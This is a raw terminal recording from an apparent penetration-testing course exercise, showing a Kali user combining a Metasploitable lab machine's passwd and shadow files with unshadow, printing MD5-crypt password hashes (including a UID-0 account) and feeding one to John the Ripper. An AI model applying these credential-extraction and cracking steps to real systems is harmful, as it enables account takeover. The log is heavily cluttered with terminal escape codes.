shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 2/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Un campo vuoto o con valore 0 indica che non c'è una età minima della password.[m
+[7m Manual page shadow(5) line 3/109 45% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 4/109 45% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1metà[0m [1mmassima[0m [1mpassword[0m[m
+[7m Manual page shadow(5) line 5/109 46% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           L'età massima password è il numero di giorni dopo il quale l'utente deve cambiare la[m
+[7m Manual page shadow(5) line 6/109 48% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           propria password.[m
+[7m Manual page shadow(5) line 7/109 48% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 8/109 48% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Quando questo numero di giorni è passato, la password può ancora essere valida. All'utente[m
+[7m Manual page shadow(5) line 9/109 50% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           verrà chiesto di cambiare la password durante il successivo accesso.[m
+[7m Manual page shadow(5) line 10/109 52% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 11/109 52% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Un campo vuoto indica che non ci sono una età massima password, un periodo di avviso e[m
+[7m Manual page shadow(5) line 12/109 53% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           nessun periodo di inattività (vedere oltre).[m
+[7m Manual page shadow(5) line 13/109 54% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 14/109 54% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Se l'età massima password è minore dell'età minima password, l'utente non può cambiare la[m
+[7m Manual page shadow(5) line 15/109 56% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           propria password.[m
+[7m Manual page shadow(5) line 16/109 57% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 17/109 57% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mperiodo[0m [1mavviso[0m [1mpassword[0m[m
+[7m Manual page shadow(5) line 18/109 58% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Il numero di giorni prima della scadenza di una password (vedere età massima password,[m
+[7m Manual page shadow(5) line 19/109 60% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           sopra) durante il quale l'utente riceve un avviso.[m
+[7m Manual page shadow(5) line 20/109 61% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 21/109 61% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Un campo vuoto e il valore 0 indicano che non c'è un periodo di avviso password.[m
+[7m Manual page shadow(5) line 22/109 63% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 23/109 63% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mperiodo[0m [1minattività[0m [1mpassword[0m[m
+[7m Manual page shadow(5) line 24/109 64% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Il numero di giorni dopo la scadenza della password (vedere età massima password, sopra)[m
+[7m Manual page shadow(5) line 25/109 66% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           durante il quale la password è ancora accettata (e l'utente dovrebbe aggiornare la propria[m
+[7m Manual page shadow(5) line 26/109 68% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           password al primo accesso).[m
+[7m Manual page shadow(5) line 27/109 69% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 28/109 69% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Dopo la scadenza della password e di questo periodo, l'utente non potrà accedere usando[m
+[7m Manual page shadow(5) line 29/109 71% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           questa password, ma dovrà contattare l'amministratore.[m
+[7m Manual page shadow(5) line 30/109 72% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 31/109 72% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Un campo vuoto implica che non è applicato il periodo di inattività.[m
+[7m Manual page shadow(5) line 32/109 73% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 33/109 73% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mdata[0m [1mscadenza[0m [1maccount[0m[m
+[7m Manual page shadow(5) line 34/109 75% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           La data di scadenza dell'account, espressa in numero di giorni dal 1 gennaio 1970.[m
+[7m Manual page shadow(5) line 35/109 76% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 36/109 76% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Note that an account expiration differs from a password expiration. In case of an account[m
+[7m Manual page shadow(5) line 37/109 78% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           expiration, the user shall not be allowed to login. In case of a password expiration, the[m
+[7m Manual page shadow(5) line 38/109 80% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           user is not allowed to login using her password.[m
+[7m Manual page shadow(5) line 39/109 81% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 40/109 81% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Un campo vuoto implica che l'account non scade mai.[m
+[7m Manual page shadow(5) line 41/109 82% (press h for help or q to quit)[27m[K[K[?1l>[?1049l[23;0;0t]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# man shadow ll[Kunshadow shadow_s.txt [K
+Usage: unshadow PASSWORD-FILE SHADOW-FILE
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow shadow_s.txt >> unshadow.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# ll
+totale 116
+-rw-r--r-- 1 root root  1418 nov 29 14:40 out_alice.txt
+-rw-r--r-- 1 root root    74 nov 29 14:11 password.txt
+-rw-r--r-- 1 root root  4897 nov 29 14:12 pwd_alice.txt
+-rw-r--r-- 1 root root 90112 nov 29 14:53 script.txt
+-rw-r--r-- 1 root root  1412 nov 29 14:51 shadow_s.txt
+-rw-r--r-- 1 root root    42 nov 29 14:54 unshadow.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat unshadow.txt 
+Usage: unshadow PASSWORD-FILE SHADOW-FILE
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# rm unshadow.txt 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# vim passwd
+[?1000h[?1049h[22;0;0t[>4;2m[?1h=[?2004h[1;46r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[46;1H"passwd" [File nuovo][2;1H▽[6n[2;1H  [1;1H[>c]10;?]11;?[2;1H[94m~                                                                                                        [3;1H~                                                                                                        [4;1H~                                                                                                        [5;1H~                                                                                                        [6;1H~                                                                                                        [7;1H~                                                                                                        [8;1H~                                                                                                        [9;1H~                                                                                                        [10;1H~                                                                                                        [11;1H~                                                                                                        [12;1H~                                                                                                        [13;1H~                                                                                                        [14;1H~                                                                                                        [15;1H~                                                                                                        [16;1H~                                                                                                        [17;1H~                                                                                                        [18;1H~                                                                                                        [19;1H~                                                                                                        [20;1H~                                                                                                        [21;1H~                                                                                                        [22;1H~                                                                                                        [23;1H~                                                                                                        [24;1H~                                                                                                        [25;1H~                                                                                                        [26;1H~                                                                                                        [27;1H~                                                                                                        [28;1H~                                                                                                        [29;1H~                                                                                                        [30;1H~                                                                                                        [31;1H~                                                                                                        [32;1H~                                                                                                        [33;1H~                                                                                                        [34;1H~                                                                                                        [35;1H~                                                                                                        [36;1H~                                                                                                        [37;1H~                                                                                                        [38;1H~                                                                                                        [39;1H~                                                                                                        [40;1H~                                                                                                        [41;1H~                                                                                                        [42;1H~                                                                                                        [43;1H~                                                                                                        [44;1H~                                                                                                        [45;1H~                                                                                                        [m[46;88H0,0-1[9CTut[1;1H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[?25l[46;78Hi[1;1H[46;78H [1;1H[46;1H[1m-- INSERISCI --[m[46;16H[K[46;88H0,1[11CTut[1;1H[?25h[?25lpostgres ALL=(ALL) NOPASSWD: /var/lib/postgresql/8.3/main/root-te[?25h[?25lmp-command.sh
+root@metasploitable:/home/msfadmin# cat /etc/passwd  [2;54H[K[3;1H[K[3;1H[?25h[?25lroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin[4;35H[K[4;35H[?25h[?25l/sh
+bin:x:2:2:bin:/bin:/bin/sh[5;27H[K[6;1Hsys:x:3:3:sys:/dev:/bin/sh[6;27H[K[7;1Hsync:x:[7;8H[K[7;8H[?25h[?25l4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh[8;38H[K[8;38H[?25h[?25l
+man:x:6:12:man:/var/cache/man:/bin/sh[9;38H[K[10;1Hlp:x:7:7:lp:/var/spool/lp[10;26H[K[10;26H[?25h[?25ld:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh[11;34H[K[12;1Hnews:x:9:9:news:/var[12;21H[K[12;21H[?25h[?25l/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh[13;42H[K[14;1Hp[14;2H[K[14;2H[?25h[?25lroxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/[15;32H[K[15;32H[?25h[?25lwww:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh[16;43H[K[17;1Hlist:x:3[17;9H[K[17;9H[?25h[?25l8:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/v[18;20H[K[18;20H[?25h[?25lar/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (a[19;44H[K[19;44H[?25h[?25ldmin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonex[20;35H[K[20;35H[?25h[?25listent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh[21;44H[K[22;1Hdhcp[22;5H[K[22;5H[?25h[?25l:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/sys[23;28H[K[23;28H[?25h[?25llog:/bin/false
+klog:x:103:104::/home/klog:/bin/false[24;38H[K[25;1Hsshd:x:104[25;11H[K[25;11H[?25h[?25l:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:ms[26;24H[K[26;24H[?25h[?25lfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/b[27;29H[K[27;29H[?25h[?25lind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false[28;49H[K[28;49H[?25h[?25l
+ftp:x:107:65534::/home/ftp:/bin/false[29;38H[K[30;1Hpostgres:x:108:117:Postg[30;25H[K[30;25H[?25h[?25lreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:10[31;11H[K[31;11H[?25h[?25l9:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:[32;16H[K[32;16H[?25h[?25l65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/[33;25H[K[33;25H[?25h[?25lbin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/ba[34;54H[K[34;54H[?25h[?25lsh
+service:x:1002:1002:,,,:/home/service:/bin/bash[35;48H[K[36;1Htelnetd:x:11[36;13H[K[36;13H[?25h[?25l2:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/pr[37;33H[K[37;33H[?25h[?25loftpd:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false[38;43H[K[39;1Hsnm[39;4H[K[39;4H[?25h[?25lp:x:115:65534::/var/lib/snmp:/bin/false
+alice:x:1500:1500::/hom[40;24H[K[40;24H[?25h[?25le/alice:/bin/sh
+bob:x:1501:1501::/home/bob:/bin/sh[41;35H[K[42;1Hdavid:x:1503[42;13H[K[42;13H[?25h[?25l:1503::/home/david:/bin/sh
+ciao:x:0:1504::/home/ciao:/bin/sh[43;34H[K[44;1H[K[44;1H[?25h[?25l[46;88H44,1[44;1H[?25h[?25l[94m~                                                                                                        [m[46;89H3,34[43;34H[?25h[46;1H[K[43;33H[?25l[46;78H^[[43;33H[46;78H  [43;34H[46;88H43,33[9CTut[43;33H[?25h[?25l[46;78H:[43;33H[46;78H[K[46;1H:[?2004h[?25hwq[?25l[?1006l[?1002l[?2004l"passwd" [Nuovo] 43L, 1904C scritti[23;2t[23;1t
+[?2004l[?1l>[?25h[>4;m[?1049l[23;0;0t]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# vim passwdrm unshadow.txt output.txt
+rm: impossibile rimuovere 'unshadow.txt': File o directory non esistente
+rm: impossibile rimuovere 'output.txt': File o directory non esistente
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# rm unshadow.txt output.txt[16Pvim passwdrm unshadow.txt [1@cat[C[C[C[C[C[C[C[C[C[C[C[C[C[Cll[Kunshadow shadow_s.txt >> unshadow.txt[1P unshadow.txt[1P unshadow.txt[1Punshadow.txt
+fopen: unshadow.txt: No such file or directory
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow shadow_s.txt unshadow.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[8Prm unshadow.txt output.txtunshadow shadow_s.txt unshadow.txt[C[K[K[K[K[K[K[K[K[K[K[K[K[K[Kt[C shadow_s.txtp shadow_s.txta shadow_s.txtssw shadow_s.txt
+passwd        password.txt  
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow passw shadow_s.txt
+passwd        password.txt  
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow passw shadow_s.txtd shadow_s.txt
+postgres ALL=(ALL) NOPASSWD: /var/lib/postgresql/8.3/main/root-temp-command.sh
+root@metasploitable:/home/msfadmin# cat /etc/passwd  
+root:x:0:0:root:/root:/bin/bash
+daemon:*:1:1:daemon:/usr/sbin:/bin/sh
+bin:*:2:2:bin:/bin:/bin/sh
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
+sync:*:4:65534:sync:/bin:/bin/sync
+games:*:5:60:games:/usr/games:/bin/sh
+man:*:6:12:man:/var/cache/man:/bin/sh
+lp:*:7:7:lp:/var/spool/lpd:/bin/sh
+mail:*:8:8:mail:/var/mail:/bin/sh
+news:*:9:9:news:/var/spool/news:/bin/sh
+uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:*:13:13:proxy:/bin:/bin/sh
+www-data:*:33:33:www-data:/var/www:/bin/sh
+backup:*:34:34:backup:/var/backups:/bin/sh
+list:*:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:*:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:!:100:101::/var/lib/libuuid:/bin/sh
+dhcp:*:101:102::/nonexistent:/bin/false
+syslog:*:102:103::/home/syslog:/bin/false
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
+sshd:*:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:$1$qca3dsPG$4xMWK1mJIWIwi.dh/fNU4.:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:*:105:113::/var/cache/bind:/bin/false
+postfix:*:106:115::/var/spool/postfix:/bin/false
+ftp:*:107:65534::/home/ftp:/bin/false
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:!:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:*:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:*:111:65534::/:/bin/false
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
+telnetd:*:112:120::/nonexistent:/bin/false
+proftpd:!:113:65534::/var/run/proftpd:/bin/false
+statd:*:114:65534::/var/lib/nfs:/bin/false
+snmp:*:115:65534::/var/lib/snmp:/bin/false
+alice:$1$lCtstULF$JALYhorA6kHwFiLOQbPBk1:1500:1500::/home/alice:/bin/sh
+bob:$1$NuU11mJV$l01w9dV2uFBBqjlKrZL7k1:1501:1501::/home/bob:/bin/sh
+david:$1$nTU11mJV$IHhkQ9f4RlpACAbJI3VlV.:1503:1503::/home/david:/bin/sh
+ciao:$1$Zn2wPHiE$O3MsCva4EkH1RPSIo37nf.:0:1504::/home/ciao:/bin/sh
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# clear
+[H[2J[3J]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat passwd
+postgres ALL=(ALL) NOPASSWD: /var/lib/postgresql/8.3/main/root-temp-command.sh
+root@metasploitable:/home/msfadmin# cat /etc/passwd  
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+snmp:x:115:65534::/var/lib/snmp:/bin/false
+alice:x:1500:1500::/home/alice:/bin/sh
+bob:x:1501:1501::/home/bob:/bin/sh
+david:x:1503:1503::/home/david:/bin/sh
+ciao:x:0:1504::/home/ciao:/bin/sh
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# sha[K[K[Kunshadow passwd shadow_s.txt 
+postgres ALL=(ALL) NOPASSWD: /var/lib/postgresql/8.3/main/root-temp-command.sh
+root@metasploitable:/home/msfadmin# cat /etc/passwd  
+root:x:0:0:root:/root:/bin/bash
+daemon:*:1:1:daemon:/usr/sbin:/bin/sh
+bin:*:2:2:bin:/bin:/bin/sh
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
+sync:*:4:65534:sync:/bin:/bin/sync
+games:*:5:60:games:/usr/games:/bin/sh
+man:*:6:12:man:/var/cache/man:/bin/sh
+lp:*:7:7:lp:/var/spool/lpd:/bin/sh
+mail:*:8:8:mail:/var/mail:/bin/sh
+news:*:9:9:news:/var/spool/news:/bin/sh
+uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:*:13:13:proxy:/bin:/bin/sh
+www-data:*:33:33:www-data:/var/www:/bin/sh
+backup:*:34:34:backup:/var/backups:/bin/sh
+list:*:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:*:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:!:100:101::/var/lib/libuuid:/bin/sh
+dhcp:*:101:102::/nonexistent:/bin/false
+syslog:*:102:103::/home/syslog:/bin/false
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
+sshd:*:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:$1$qca3dsPG$4xMWK1mJIWIwi.dh/fNU4.:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:*:105:113::/var/cache/bind:/bin/false
+postfix:*:106:115::/var/spool/postfix:/bin/false
+ftp:*:107:65534::/home/ftp:/bin/false
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:!:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:*:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:*:111:65534::/:/bin/false
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
+telnetd:*:112:120::/nonexistent:/bin/false
+proftpd:!:113:65534::/var/run/proftpd:/bin/false
+statd:*:114:65534::/var/lib/nfs:/bin/false
+snmp:*:115:65534::/var/lib/snmp:/bin/false
+alice:$1$lCtstULF$JALYhorA6kHwFiLOQbPBk1:1500:1500::/home/alice:/bin/sh
+bob:$1$NuU11mJV$l01w9dV2uFBBqjlKrZL7k1:1501:1501::/home/bob:/bin/sh
+david:$1$nTU11mJV$IHhkQ9f4RlpACAbJI3VlV.:1503:1503::/home/david:/bin/sh
+ciao:$1$Zn2wPHiE$O3MsCva4EkH1RPSIo37nf.:0:1504::/home/ciao:/bin/sh
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow passwd shadow_s.txt  [K| grep david
+david:$1$nTU11mJV$IHhkQ9f4RlpACAbJI3VlV.:1503:1503::/home/david:/bin/sh
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow passwd shadow_s.txt | grep david | jho[K[Ko
+jobs        john        join        journalctl  
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow passwd shadow_s.txt | grep david | jo
+jobs        john        join        journalctl  
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow passwd shadow_s.txt | grep david | john 
+John the Ripper 1.9.0-jumbo-1 OMP [linux-gnu 64-bit x86_64 AVX AC]
+Copyright (c) 1996-2019 by Solar Designer and others
+Homepage: http://www.openwall.com/john/
+
+Usage: john [OPTIONS] [PASSWORD-FILES]
+--single[=SECTION[,..]]    "single crack" mode, using default or named rules
+--single=:rule[,..]        same, using "immediate" rule(s)
+--wordlist[=FILE] --stdin  wordlist mode, read words from FILE or stdin
+                  --pipe   like --stdin, but bulk reads, and allows rules
+--loopback[=FILE]          like --wordlist, but extract words from a .pot file
+--dupe-suppression         suppress all dupes in wordlist (and force preload)
